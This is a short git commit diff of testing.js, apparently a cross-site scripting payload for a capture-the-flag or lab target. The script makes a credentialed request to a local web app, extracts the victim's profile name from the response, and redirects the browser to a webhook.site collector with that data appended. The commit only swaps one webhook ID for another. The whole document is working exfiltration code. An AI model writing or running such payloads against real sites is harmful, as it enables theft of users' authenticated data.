04d9a8b8fd108eef059ee09433be7490cfb8c819
fanky <66038123+el-queso@users.noreply.github.com>
2022-09-03 15:06:46 +0300

    Update testing.js

--- testing.js
+++ testing.js
@@ -3,7 +3,7 @@ r.open("GET", "http://127.0.0.1:8080/", true);
 r.onreadystatechange = function() { 
     if (r.readyState == 4){
         var res = r.response.split('\'s Profile')[0].split('<h1>')[0].replace(/\s/g, '');
-        window.location = 'https://webhook.site/2bc172cc-3fe7-4c42-875a-366c0ab4699c/q=' + res;
+        window.location = 'https://webhook.site/a3adedf1-127c-4055-a555-070ae3808481/q=' + res;
     }
 };
 r.withCredentials = true;
